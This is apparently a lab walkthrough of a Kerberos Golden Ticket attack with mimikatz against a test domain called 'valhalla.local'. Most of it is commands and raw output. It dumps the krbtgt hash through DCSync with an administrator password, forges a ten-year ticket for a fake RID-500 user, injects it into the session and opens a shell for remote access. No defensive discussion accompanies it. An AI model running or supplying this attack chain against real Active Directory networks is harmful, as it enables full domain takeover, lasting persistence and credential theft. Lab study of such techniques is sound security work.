
# Golden Ticket

activate debug mode

	mimikatz # privilege::debug
	
	
Get krbtgt user hash and sid value (remote) (fail because authentication problem)

	mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt
	[DC] 'valhalla.local' will be the domain
	[DC] 'odin.valhalla.local' will be the DC server
	[DC] 'krbtgt' will be the user account
	[rpc] Service  : ldap
	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
	ERROR kull_m_rpc_drsr_getDCBind ; RPC Exception 0x00000005 (5)
	
	
Get krbtgt user hash and sid value (remote) 

	mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt /authuser:administrator /authpassword:Pass123!
	[DC] 'valhalla.local' will be the domain
	[DC] 'odin.valhalla.local' will be the DC server
	[DC] 'krbtgt' will be the user account
	[rpc] Service  : ldap
	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
	[rpc] Username : administrator
	[rpc] Domain   : 
	[rpc] Password : Pass123!

	Object RDN           : krbtgt

	** SAM ACCOUNT **

	SAM Username         : krbtgt
	Account Type         : 30000000 ( USER_OBJECT )
	User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
	Account expiration   : 
	Password last change : 13.08.2021 07:22:10
	Object Security ID   : S-1-5-21-3410397846-649609989-2919355437-502
	Object Relative ID   : 502

	Credentials:
	  Hash NTLM: c2d3b9268608fab2b14a8c78c36316aa
		ntlm- 0: c2d3b9268608fab2b14a8c78c36316aa
		lm  - 0: 36fa5c99898f8a75a7783f250a6bf892


Generate Golden Ticket

	mimikatz # kerberos::golden /domain:valhalla.local /sid:S-1-5-21-3410397846-649609989-2919355437 /rc4:c2d3b9268608fab2b14a8c78c36316aa /id:500 /user:IgotGoldenTicketCharlie
	User      : IgotGoldenTicketCharlie
	Domain    : valhalla.local (VALHALLA)
	SID       : S-1-5-21-3410397846-649609989-2919355437
	User Id   : 500
	Groups Id : *513 512 520 518 519 
	ServiceKey: c2d3b9268608fab2b14a8c78c36316aa - rc4_hmac_nt      
	Lifetime  : 14.08.2021 01:11:51 ; 12.08.2031 01:11:51 ; 12.08.2031 01:11:51
	-> Ticket : ticket.kirbi

	 * PAC generated
	 * PAC signed
	 * EncTicketPart generated
	 * EncTicketPart encrypted
	 * KrbCred generated

	Final Ticket Saved to file !
	
	
	
Inject ticket to current session
	
	mimikatz # kerberos::ptt ticket.kirbi

	* File: 'ticket.kirbi': OK


Open new cmd with injected ticket

	mimikatz # misc::cmd
	Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 000000004AC49C78

Access remote pc with normal shell

![image](https://user-images.githubusercontent.com/13157446/129424592-e3ed2a44-da5b-4092-a510-ec0c82c379af.png)


![image](https://user-images.githubusercontent.com/13157446/129424244-a7789524-03b0-454f-9c31-00ea922325a1.png)


Access remote pc 

![image](https://user-images.githubusercontent.com/13157446/129424569-f6d10db2-4e5f-402d-beb9-f827cb25fada.png)


![image](https://user-images.githubusercontent.com/13157446/129424166-5296aee2-0d58-4906-8331-19c1d34e3526.png)
